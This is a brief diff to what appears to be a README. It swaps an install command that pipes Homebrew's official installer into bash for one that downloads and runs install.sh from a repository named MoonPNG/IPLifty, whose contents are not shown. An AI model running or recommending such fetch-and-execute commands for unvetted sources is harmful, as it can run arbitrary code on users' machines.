@@ -6,5 +6,5 @@
 To execute the script, use the following command:
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" 
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/MoonPNG/IPLifty/refs/heads/main/install.sh)" 
 ```
